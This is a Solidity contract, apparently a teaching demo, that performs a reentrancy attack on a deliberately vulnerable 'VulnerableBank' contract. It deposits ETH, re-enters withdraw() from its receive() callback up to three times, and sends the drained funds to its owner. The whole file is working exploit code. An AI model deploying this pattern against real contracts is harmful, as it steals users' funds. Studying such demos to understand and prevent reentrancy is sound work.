// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{VulnerableBank} from "VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackCount;
    uint256 public attackLimit;

    // 添加事件以便跟踪
    event AttackStarted(uint256 initialDeposit);
    event ReentrancyTriggered(uint256 count, uint256 bankBalance);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
        attackLimit = 3; // 设置小一点，方便观察
    }

    // 发起攻击的函数
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");

        // 先存入一些ETH
        vulnerableBank.deposit{value: msg.value}();
        emit AttackStarted(msg.value);

        // 然后触发提款，这将启动重入攻击
        attackCount = 0;
        vulnerableBank.withdraw();
    }

    // 接收ETH的回调函数，这是重入攻击的核心
    receive() external payable {
        attackCount++;
        uint256 bankBalance = address(vulnerableBank).balance;
        emit ReentrancyTriggered(attackCount, bankBalance);

        // 如果银行还有余额并且没有达到攻击限制，继续攻击
        if (attackCount < attackLimit && bankBalance > 0) {
            vulnerableBank.withdraw();
        }
    }

    // 提取攻击所得
    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 amount = address(this).balance;
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Transfer failed");
        emit AttackCompleted(amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

